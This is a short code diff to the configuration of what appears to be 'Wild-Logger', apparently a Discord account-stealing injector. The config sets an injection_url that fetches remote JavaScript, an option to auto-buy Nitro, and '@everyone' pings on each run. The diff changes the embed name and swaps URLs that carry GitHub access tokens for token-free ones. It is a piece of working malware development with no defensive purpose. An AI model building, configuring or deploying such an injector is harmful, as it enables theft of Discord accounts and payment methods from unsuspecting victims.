@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Wild inject', 
-  embed_icon: 'https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg?token=GHSAT0AAAAAACGMKFC5R7TUTLVECDJZFB2CZG6D2TQ'.replace(/ /g, '%20'), 
+  embed_name: 'Wild', 
+  embed_icon: 'https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/index.js?token=GHSAT0AAAAAACGMKFC42PCJPW7PBPYQVFHUZG5D5ZQ', 
+  injection_url: 'https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/DELETE%20ME!/index.js', 
   /**
    
    **/
